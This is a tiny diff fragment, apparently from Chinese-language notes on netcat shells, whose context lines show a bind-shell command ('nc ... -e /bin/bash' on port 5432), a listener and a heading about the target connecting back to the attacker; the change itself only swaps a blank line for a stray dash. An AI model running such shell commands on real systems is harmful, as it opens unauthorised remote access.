@@ -39,7 +39,7 @@ nc -n -lvvp 5432 -t -e /bin/bash
 ```
 nc -lvvp 5432
 ```
-
+ -
 目标机连接攻击机
 
 ```bash
